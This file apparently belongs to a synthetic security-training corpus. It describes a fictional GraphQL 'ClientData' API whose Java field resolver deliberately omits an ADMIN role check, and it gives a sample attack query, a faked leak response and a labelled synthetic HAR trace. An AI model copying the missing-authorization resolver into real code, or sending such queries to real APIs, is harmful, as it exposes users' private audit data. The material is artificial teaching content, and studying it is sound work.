@@ -1,0 +1,210 @@
+Here is the thirty-fifth system, continuing the focus on GraphQL-specific security failures. We are shifting into the **Enterprise / Customer Data Portal** sector, focusing on a **Client Identity & Interface GraphQL API**.
+
+For the vulnerabilities, we are focusing on **Pattern 9.1 (GraphQL Operations - Field Selection)** combined with **Pattern 2.1 (Functional Pivot / Vertical Access)**. This scenario demonstrates how an attacker exploits an improperly secured field defined on an Interface or Union type within the GraphQL schema. The attacker, authenticated as a low-privilege user, successfully queries a hidden administrative field (`internalAuditData`) that should only be visible to top-tier support agents, achieving vertical privilege escalation in data access.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** ClientData GraphQL Interface API
+**Document Version:** 5.0.0 (FINAL)
+**Classification:** CONFIDENTIAL / PII & INTERNAL AUDIT SCOPE
+**Domain:** Enterprise SaaS / Identity & Profile Management / Data Interfaces
+
+## 1.0 Executive Summary
+The ClientData API serves core user and account information to the main application portal and internal support tools. The API is implemented using GraphQL to leverage Interfaces, which allow the system to treat disparate object types (e.g., `BasicUser`, `EnterpriseUser`, `AdminUser`) polymorphically.
+
+The core security requirement is role-based field visibility. The `internalAuditData` field, which contains PII audit trails, is intended to be defined on the top-level `Client` interface but must only be returned when the authenticated user possesses the `ADMIN` role. The standard `USER` role should receive a soft `null` or an explicit error for this field.
+
+## 2.0 Comprehensive Network Topology & GraphQL Processing
+The architecture relies on a federated GraphQL gateway for object resolution.
+
+### 2.1 The Ingress Layer & GraphQL Router
+* **API Gateway:** Handles initial JWT validation.
+* **Apollo Gateway:** The central routing layer.
+
+### 2.2 The Backend Core Services
+* **Profile Service (Java Spring):** The resolver logic for the `Client` interface and its concrete types. This service contains the vulnerable field resolver.
+
+## 3.0 Identity, Sessions, and Field Authorization
+The security model relies on field resolvers to enforce access control based on the user's role claim.
+
+### 3.1 User Authentication (JWT)
+Users authenticate via corporate SSO, and their JWT contains the `user_id` and their `role` (`USER` or `ADMIN`).
+
+### 3.2 The Field-Level Authorization Flaw
+The `Client.internalAuditData` field resolver fails to inspect the authenticated user's role context before fetching and returning the sensitive data. Because the field is defined on the shared `Client` interface, any concrete type (like `BasicUser`) can be queried for this field, and the vulnerable resolver will execute.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The `internalAuditData` field was created last month and was intended to be protected by a `@requiresAuth(role: ADMIN)` directive. The directive was forgotten during the final schema merge, leaving the field resolver unprotected. Tracked as RISK-GRPH-906.*
+
+### 4.1 Vulnerability A: Unauthorized Field Selection on Interface Type
+**Taxonomy Pattern:** 9.1 (GraphQL Operations - Field Selection) & 2.1 (Functional Pivot / Vertical Access)
+**Sub-system:** Profile Service Resolver (`Client.internalAuditData`)
+
+**The Deep Architectural Flaw:**
+This attack leverages GraphQL's ability to specify desired fields (over-fetching) to access privileged data that was left unprotected at the field-resolver level.
+
+1. **Field Over-Fetching (Pattern 9.1):** The attacker, possessing the low-privilege `USER` role, crafts a query for their own account (`Query: me`). They explicitly include the restricted field `internalAuditData` in the field selection set.
+
+2. **Vertical Access Flaw (Pattern 2.1):** The Java resolver executes the field query. It recognizes the user is querying their own object (BOLA check passes implicitly via the `me` query) but fails to check the `role` context. It performs the database lookup for the audit data and returns it, achieving vertical privilege escalation in data access.
+
+**The Exploitation Path:**
+
+1. **The Foothold:** An attacker authenticates as a standard user (`user_low_priv`) with the `USER` role.
+2. **The Query:** The attacker crafts a GraphQL query that targets the `me` field (which retrieves their own data) and requests the sensitive field `internalAuditData`.
+3. **The Execution:** The query passes the authentication and routing layers. The `internalAuditData` resolver executes without a role check.
+4. **The Impact:** The attacker successfully extracts the internal audit trail for their own account, including flags for impossible travel, login frequency anomalies, or PII change history that should only be visible to a system administrator.
+
+***
+
+# CLIENTDATA API: SCHEMAS, VULNERABLE CODE, & GRAPHQL CONTRACTS
+**Document Version:** 4.1.0
+**Applies to Architecture:** ClientData GraphQL Interface API v5.0.0
+
+## 5.0 Database Schema (PostgreSQL)
+The database stores internal audit data adjacent to standard user data, requiring strict field-level BOLA.
+
+```sql
+-- Core User Table (Client implementation)
+CREATE TABLE client_users (
+user_id UUID PRIMARY KEY,
+tenant_id VARCHAR(50) NOT NULL,
+display_name VARCHAR(100) NOT NULL,
+role VARCHAR(20) DEFAULT 'USER',
+internal_audit_data JSONB -- SENSITIVE: Internal login/PII change history
+);
+
+CREATE INDEX idx_user_tenant ON client_users(tenant_id);
+```
+
+## 6.0 The Flawed Implementation (Java / Spring Boot Resolver)
+The resolver for the sensitive field is implemented without a role-based guard clause.
+
+### 6.1 Vulnerable Field Resolver
+```java
+// File: resolvers/ClientResolver.java
+
+@Component
+public class ClientResolver implements GraphQLResolver<Client> {
+// This resolver is attached to the 'Client' Interface type.
+// Client.internalAuditData: Executes for ALL roles
+public JsonNode internalAuditData(Client client, DataFetchingEnvironment env) {
+    // AuthContext contains the authenticated user's role
+    String authenticatedRole = env.getContext().get("role"); 
+
+    // VULNERABILITY 2.1 & 9.1: Missing Role Check
+    // The code FAILS to check: if (!"ADMIN".equals(authenticatedRole)) { return null; }
+
+    // Direct database fetch of the sensitive field
+    return db.fetchAuditDataByUserId(client.getUserId()); 
+}
+}
+```
+
+## 7.0 GraphQL API Contract (The Over-Fetching Attack)
+The attacker queries the field name that should have been restricted based on their role.
+
+### 7.1 Execute Unauthorized Field Selection
+**Endpoint:** `POST /graphql`
+**Description:** Queries the restricted `internalAuditData` field using a low-privilege token.
+
+**Required Headers:**
+```http
+Authorization: Bearer <Low_Privilege_User_JWT>
+Content-Type: application/json
+```
+
+**Malicious Request Payload:**
+```graphql
+query DataLeakOnInterface {
+me {
+id
+displayName
+# RESTRICTED FIELD: This should return null for a 'USER' role
+internalAuditData
+}
+}
+```
+
+**Success Response (200 OK - Internal Data Leak):**
+```json
+{
+"data": {
+"me": {
+"id": "usr-88192A",
+"displayName": "Attacker User",
+"internalAuditData": {
+"lastLoginIP": "203.0.113.45",
+"failedLoginAttemptsLast24h": 5,
+"piiChangeHistory": [
+{
+"timestamp": "2026-04-09 T10:00:00Z",
+"field": "address",
+"previousValueHash": "SHA256:abcd..."
+}
+]
+}
+}
+}
+}
+```
+
+***
+
+# SYNTHETIC ARTIFACT: GRAPHQL FIELD VERTICAL ESCALATION (HAR TRACE)
+**Applies to Architecture:** ClientData GraphQL Interface API v5.0.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 9.1 & Pattern 2.1)
+
+This HTTP Archive (HAR) trace captures the moment a low-privilege user successfully retrieves data from a restricted administrative field. The attacker, authenticated with a `USER` role, submits a query to the `/graphql` endpoint.
+
+The query requests the highly sensitive `internalAuditData` field. Because the Java resolver for this field lacks a role-based authorization check, it executes the database lookup and returns the internal audit data. The `200 OK` response includes the field, confirming that the attacker achieved vertical privilege escalation in data access (Pattern 2.1) via GraphQL field selection (Pattern 9.1).
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Apollo Gateway / Java APM",
+"version": "5.0.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-10 T13:15:10.055Z",
+"time": 48,
+"request": {
+"method": "POST",
+"url": "https://api.clientdata.com/graphql",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.clientdata.com" },
+{ "name": "authorization", "value": "Bearer USER_JWT_88192A..." },
+{ "name": "content-type", "value": "application/json" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"query\": \"query DataLeakOnInterface { me { id displayName internalAuditData } }\"}"
+},
+"bodySize": 120
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-resolver-nodes", "value": "1" }
+],
+"content": {
+"size": 420,
+"mimeType": "application/json",
+"text": "{\"data\": {\"me\": {\"id\": \"usr-88192A\", \"displayName\": \"Attacker User\", \"internalAuditData\": {\"lastLoginIP\": \"203.0.113.45\", \"failedLoginAttemptsLast24h\": 5, \"piiChangeHistory\": [{\"timestamp\": \"2026-04-09 T10:00:00Z\", \"field\": \"address\", \"previousValueHash\": \"SHA256:abcd...\"}]}}}}\"
+},
+"bodySize": 420
+}
+}
+]
+}
+}
+```
+
+***
